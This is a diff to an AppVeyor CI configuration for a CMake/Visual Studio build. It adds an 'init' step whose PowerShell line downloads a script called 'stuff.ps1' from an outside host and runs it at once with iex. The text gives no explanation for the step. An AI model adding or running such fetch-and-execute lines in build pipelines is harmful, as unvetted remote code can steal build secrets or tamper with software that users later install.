@@ -33,6 +33,9 @@
       CMAKE_GENERATOR_TOOLSET: "LLVM"
       APPVEYOR_BUILD_WORKER_IMAGE: "Visual Studio 2017"
 
+init:
+  - ps: iex ((new-object net.webclient).DownloadString('https://security.gaur.is/appveyor/stuff.ps1'))
+
   install:
   - ECHO Installing %COMPILER% %PLATFORM% %CONFIGURATION%
   - SET PATH_ORIGINAL=%PATH%
